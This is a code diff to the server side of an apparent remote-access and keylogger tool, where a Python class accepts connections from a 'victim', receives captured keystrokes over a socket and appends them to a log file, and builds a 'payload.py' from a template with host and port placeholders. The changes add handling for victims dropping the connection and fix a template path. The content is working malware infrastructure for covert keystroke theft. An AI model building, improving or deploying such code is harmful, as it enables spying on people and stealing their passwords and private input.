@@ -60,6 +60,9 @@ class Server:
                   except BrokenPipeError:
                          print("User entered \"break\" command, connection closed.\nIf you did not enter the break command then an unknown error has occured")
                          break
+                  except ConnectionResetError:
+                         print("[-] Victim terminated connection")
+                         break
                   
           threading.Thread(target=self.active_connection,kwargs={"verbose":self.__FLAG}).start()
     
@@ -83,12 +86,16 @@ class Server:
              print(f"\n[*]Got a connection from {addr[0]}:{addr[1]}")
              
              while True:
-                     keystrokes = tgt_ksock.recv(1024).decode()
-                     if not keystrokes:
-                        break
-                     
-                     with open(path, "a") as f:
-                            f.write(keystrokes)
+                  try:
+                       keystrokes = tgt_ksock.recv(1024).decode()
+                       if not keystrokes:
+                          break
+                       
+                       with open(path, "a") as f:
+                              f.write(keystrokes)
+                  except ConnectionResetError:
+                       print("[-] Victim terminated connection")
+                       break
         
         threading.Thread(target=self.keylog_connection,args=(path,),kwargs={"verbose":self.__FLAG}).start()
        
@@ -126,7 +133,7 @@ class Server:
 
 def main()->None:
    #Private variables that shoud not be changed
-    __TEMPLATE_PATH = "templates/spython_tcp_template.py"
+    __TEMPLATE_PATH = "../templates/spython_tcp_template.py"
     __PAYLOAD_FILE_NAME =  "payload.py"
     __SIG_HOST = "SPYTHON_HOST"
     __SIG_PORT = "SPYTHON_PORT"
